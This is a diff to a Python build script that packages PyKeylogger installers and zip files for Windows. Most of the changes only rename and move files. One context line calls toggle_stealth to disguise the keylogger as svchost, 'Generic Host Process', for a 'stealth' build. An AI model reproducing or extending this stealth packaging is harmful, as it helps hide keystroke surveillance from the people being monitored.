@@ -88,7 +88,8 @@ class DistributionBuilder:
             self.toggle_stealth('svchost','Generic Host Process', 1)
         
         self.build_executable()
-        self.build_sdist()
+        if self.disttype != 'stealth':
+            self.build_sdist()
         
         if self.disttype == 'nonag' or self.disttype == 'stealth':
             self.toggle_nag('True')
@@ -116,10 +117,10 @@ class DistributionBuilder:
         print r'rename "dist" "pykeylogger-' + version.version + '""'
         os.system(r'rename "dist" "pykeylogger-' + version.version + '""')
         
-        #if self.disttype == 'nonag' or self.disttype == 'standard':
         self.build_nsis_installer()
-        #os.system(r'move .\pykeylogger-' + version.version + '_win32_installer.exe 
-        os.system(r'rename ".\pykeylogger-' + version.version + r'_win32_installer.exe" ".\pykeylogger-' + version.version + self.filename_addendum + r'_win32_installer.exe"')
+        
+        print r'move ".\pykeylogger-' + version.version + r'_win32_installer.exe" ".\pykeylogger-' + version.version + self.filename_addendum + r'_win32_installer.exe"'
+        os.system(r'move ".\pykeylogger-' + version.version + r'_win32_installer.exe" ".\pykeylogger-' + version.version + self.filename_addendum + r'_win32_installer.exe"')
 
         print "zipping executables"
         self.ZipFiles(r"pykeylogger-" + version.version, "pykeylogger-" + version.version + self.filename_addendum + "_win32.zip")
@@ -139,8 +140,8 @@ class DistributionBuilder:
         print r'move ".\pykeylogger-' + version.version + self.filename_addendum + r'_win32.zip" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32.zip"'
         os.system(r'move ".\pykeylogger-' + version.version + self.filename_addendum + r'_win32.zip" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32.zip"')
 
-        print r'move ".\pykeylogger-' + version.version + r'_win32_installer.exe" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32_installer.exe"'
-        os.system(r'move ".\pykeylogger-' + version.version + r'_win32_installer.exe" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32_installer.exe"')
+        print r'move ".\pykeylogger-' + version.version + self.filename_addendum + r'_win32_installer.exe" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32_installer.exe"'
+        os.system(r'move ".\pykeylogger-' + version.version + self.filename_addendum +  r'_win32_installer.exe" "..\pykeylogger-' + version.version + self.filename_addendum + '_win32_installer.exe"')
 
         #os.system(r'pause')
     
